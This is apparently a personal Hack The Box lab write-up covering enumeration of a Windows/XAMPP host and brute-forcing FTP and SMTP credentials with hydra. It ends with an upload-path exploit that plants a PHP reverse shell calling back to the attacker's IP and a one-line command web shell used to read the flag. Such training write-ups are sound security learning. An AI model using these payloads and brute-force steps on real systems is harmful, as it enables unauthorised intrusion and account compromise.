---
platform: hackthebox
difficulty: Easy
status: Completed
date: 2026-09-21
tags:
  - difficulty/easy
---
# HTB: Attacking Common Services - Easy

**Targets:** `10.129.219.75` , `inlanefreight.htb`

---

## 01 - Scope
### Assignment:
We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:
- `HTB{...}`
Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
### Objectives:
- **Primary Goals:**
  - [x] You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. 


---

## 02 - Procedure
1. First I checked the target servers services:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 10.129.219.75 > default-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921084236.png)

```bash
nmap -p 21,25,80,443,587,3306,3389 -sC -sV 10.129.219.75 > detailed-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921093812.png)

2. Then I checked the webserver and noticed:
	- `HTTPS` is prompting for a login

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921084712.png)

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921084815.png)

3. So I started enumerating vhosts and subsites with `gobuster`:
```bash
gobuster vhost -u http://10.129.219.75 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --domain inlanefreight.htb
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921091022.png)

```bash
gobuster dir -u http://10.129.219.75/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921091903.png)

4. Since all the forbidden sites `403` are probably only accessible with credentials, I checked if I can login with the default login of `XAMPP` "root"on the login-page which didn't work. So I checked if I can login on mysql:
```bash
mysql -u root -p -h 10.129.219.75 --skip-ssl
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921095243.png)

5. I think I'm running into a dead end so far, that's why I went back to the nmap-scan and checked  for other clues. After inspecting FTP further I found out, that it could be vulnerable to the `PathTraversal/Upload Vulnerability` "CVE-2022-22836". For which we will first need an "Upload page". That's why I fuzzed the website:
```bash
ffuf -u http://10.129.219.75/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.html,.bak,.zip -ic 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921105043.png)

6. After manually checking the found pages such as `Test.php` I couldn't find any further clues.
7. I therefor downloaded the entire webpage and filtered its content for keywords such as `username,password,etc.` and found a bunch of default login credentials which I tried against `ftp`, `mysql` and `website login page`, but all of them didn't work:
```bash
wget --recursive --level=3 --no-clobber --page-requisites --html-extension --convert-links -e robots=off http://inlanefreight.htb/
```

```bash
grep -rnEi "user|username|login|password|pass|cred|admin|" site
```

8. I then enumerated smtp with the user-list provided by `HTB` and found the email `fiona@inlanefreight.htb`:
```bash
smtp-user-enum -M RCPT -U /home/breezy/Downloads/users.list -t 10.129.219.75 -w 15 -m5 -D inlanefreight.htb
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921113231.png)

9. Afterwards I tried bruteforcing her password with `hydra` and the provided wordlist form `htb`, which didn't find a password:
```bash
hydra -l "fiona@inlanefreight.htb" -P /home/breezy/Downloads/pws.list -s 25 -vV -f 10.129.219.75 smtp
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921114324.png)

10. I also tried `ftp`, which was the same result, nothing:
```bash
hydra -l "fiona" -P /home/breezy/Downloads/pws.list -s 21 -t 2 -c 1 -vV -f 10.129.219.75 ftp
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921120542.png)

11. And `mysql`, nothing:
```bash
hydra -l "fiona" -P /home/breezy/Downloads/pws.list -s 3306 -vV -f 10.129.219.75 mysql
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921120307.png)

12. At this point I lookup up walkthrough, which guided me towards using `rockyou.txt`. Which did work for both `ftp` and `smtp`, but was rather unpleasent:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921121928.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921122307.png)

13. I connected to ftp and found two rather useless documents, but we now have the possibility to upload a reverse shell:
**![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921124829.png)


14. So that's what I did, I uploaded the `php reverse shell`:
```php
<?php
$ip = '10.10.15.52';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('cmd.exe', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921125649.png)

15. By the way, the credentials of `fiona` also works for the website. The only issue was, that `php` can't be executed in this directory, thus it just gets downloaded as file:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921130449.png)

16. That's where the CVE found during the enumeration comes into play:
https://www.exploit-db.com/exploits/50652

17. I managed to upload and execute the reverse shell, via the `Upload vulnerability` but the nc-listener (on my machine) always cancelled abruptly after executing the uploaded shell:
```bash
curl -k -X PUT -H "Host: 10.129.219.75" --basic -u fiona:987654321 --data-binary "@reverse-shell.php" --path-as-is https://10.129.219.75/../../xampp/htdocs/shell.php
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921134251.png)

18. I therefor uploaded a webshell and tried again:
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921134540.png)

19. From this point on I was able to locate the file `flag.txt` over powershell and afterwards retrieve its content:
```bash
curl "http://10.129.219.75/shell.php?cmd=powershell+Get-ChildItem+-Path+C:\+-Recurse+-Filter+flag.txt+-ErrorAction+SilentlyContinue"
```

```bash
curl "http://10.129.219.75/shell.php?cmd=powershell+Get-Content+C:\Users\Administrator\Desktop\flag.txt"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921135503.png)

## 03 - Lesson Learned
1. `SMTP` can be much faster to bruteforce than `ftp` or `mysql`